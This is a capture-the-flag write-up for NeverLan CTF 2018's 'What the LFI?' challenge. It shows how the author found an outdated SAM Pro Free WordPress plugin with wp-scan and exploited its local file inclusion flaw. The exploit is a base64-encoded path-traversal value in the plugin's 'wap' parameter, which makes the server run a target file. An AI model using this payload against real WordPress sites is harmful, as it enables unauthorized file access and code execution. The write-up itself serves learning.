# NeverLan CTF 2018: What the LFI?

**Category:** Web Exploitation
**Points:** 200

**Description:**

>There is a file located at /var/www/blah.php Get that file to execute to retrieve the flag.

>http://54.201.224.15:14099


## Write-up

Ok, so we looking for some LFI.

We have some links `?feed=rss2 / ?p=1 / ?m=201802` but there is no LFI..

As we see this can be site on wordpress engine:
>\<meta name="generator" content="WordPress 4.9.4" /\>

So we can try wp-scan...and there is our LFI! We have outdated plugin here.

    [!] Title: SAM Pro (Free Edition) <= 1.9.6.67 - Local File Inclusion (LFI)
      Reference: https://wpvulndb.com/vulnerabilities/8647
      Reference: https://www.pluginvulnerabilities.com/2016/10/28/local-file-inclusion-lfi-vulnerability-in-sam-pro-free-edition/
      Reference: https://plugins.trac.wordpress.org/changeset/1526624/sam-pro-free

Let's do this.

**Step 1:**

`echo -n 'test.php' | base64`

`http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=dGVzdC5waHA=`

>No such file or directory in /var/www/html/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php

**Step 2:**

Let's craft good directory.

`echo -n '../../../../blah.php' | base64`

`http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=Li4vLi4vLi4vLi4vYmxhaC5waHA=`

That's all, the flag is `flag{dont_include_files_derived_from_user_input_kthx_bai}`.
